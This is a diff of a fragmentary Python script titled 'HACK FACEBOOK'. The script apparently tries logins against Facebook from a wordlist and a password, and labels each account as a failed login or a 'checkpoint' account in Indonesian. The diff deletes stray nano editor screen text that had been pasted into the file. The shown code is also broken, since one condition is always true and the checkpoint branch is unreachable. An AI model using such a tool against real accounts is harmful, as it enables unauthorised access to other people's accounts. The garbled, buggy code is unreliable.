@@ -1,7 +1,4 @@
 # ReinMbf
-
-     
-
 import requests
 import os
 
@@ -18,7 +15,7 @@ def login(id,pw):
       if 'm_ses' in r.url or 'save-device':
             print(f'{id} > {h}llogin gagal{x}')
       elif 'check point' in r.url:
-            print(f'{id} > {k}akun checkpoint{x}')
+            print(f'{id} > {k}akun ceckpoint{x}')
       else:
             print(f'{id} > {m}login gagal{x}')
 
@@ -37,9 +34,5 @@ if __name__=='__main__':
       print(h+'HACK FACEBOOK'.center(40))
       print(m+'by ReinXceed'.center(40))
       f = input('worldlist: ' )
-                              [ Read 37 lines ]
-^G Get Help    ^O Write Out   ^W Where Is    ^K Cut Text    ^J Justify
-^X Exit        ^R Read File   ^\ Replace     ^U Pasteif __name__=='__main__':
-      f = input('worldlist: ' )
-      pw = input('password: ')
-
+      pw = input('email: ' )
+      lis(f,pw)
